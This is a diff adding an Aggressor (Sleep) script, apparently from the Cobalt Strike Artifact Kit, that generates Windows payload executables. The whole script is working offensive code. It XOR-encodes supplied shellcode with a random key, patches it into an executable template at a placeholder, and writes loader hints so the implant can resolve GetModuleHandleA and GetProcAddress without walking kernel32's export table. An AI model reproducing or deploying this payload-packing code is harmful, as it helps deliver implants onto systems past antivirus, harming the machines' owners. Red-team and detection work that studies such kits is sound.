@@ -1,0 +1,75 @@
+# Artifact Kit Integration Script
+
+# Windows Executables and DLLs
+#
+# Arguments
+# 	$1 = artifact file (e.g., artifact32.exe)
+# 	$2 = shellcode
+# Return 
+#	our generated artifact
+set EXECUTABLE_ARTIFACT_GENERATOR {
+	local('$handle $data $key $index $payload $resource $buffer $b $x');
+
+	($resource, $payload) = @_;
+
+	# try again or use the default artifact... I don't have it!
+	if (!-exists script_resource($resource)) {
+		return $null;
+	}
+
+	# read in the executable template
+	$handle = openf(script_resource($resource));
+	$data = readb($handle, -1);
+	closef($handle);
+
+	# generate a random key
+	$key = @();
+	$key[0] = int(rand() * 253) + 1;
+	$key[1] = int(rand() * 253) + 1;
+	$key[2] = int(rand() * 253) + 1;
+	$key[3] = int(rand() * 253) + 1;
+
+	# find the location of our data in the executable
+	$index = indexOf($data, 'A' x 1024);
+
+	# pack data into a buffer 
+	$buffer = allocate(1024);
+
+	# [offset of payload data in binary] - 4 bytes
+	writeb($buffer, pack("i-", $index + 16));
+
+	# [length of payload] - 4 bytes
+	writeb($buffer, pack("i-", strlen($payload)));
+
+	# [xor key] - 4 bytes
+	writeb($buffer, chr($key[0]) );
+	writeb($buffer, chr($key[1]) );
+	writeb($buffer, chr($key[2]) );
+	writeb($buffer, chr($key[3]) );
+
+	# write our pointer offsets to allow the agent to bootstrap itself
+	# without walking the kernel32 Export Address Table
+	#
+	# Some shellcodes don't support this hint; so we need to check.
+	#
+	if (-hasbootstraphint $payload) {
+		writeb($buffer, pack("i-", payload_bootstrap_hint($payload, "GetModuleHandleA")));
+		writeb($buffer, pack("i-", payload_bootstrap_hint($payload, "GetProcAddress")));
+	}
+	else {
+		writeb($buffer, pack("i-", 0));
+		writeb($buffer, pack("i-", 0));
+	}
+
+	# pack our encoded payload into the buffer
+	for ($x = 0; $x < strlen($payload); $x++) {
+		writeb( $buffer, chr( (byteAt($payload, $x) ^ $key[$x % 4]) & 0xFF ) );
+	}
+
+	# retrieve the contents of the buffer.
+	closef($buffer);
+	$b = readb($buffer, -1);
+
+	# return our encoded shellcode.
+	return replaceAt($data, "$[1024]b", $index);
+}
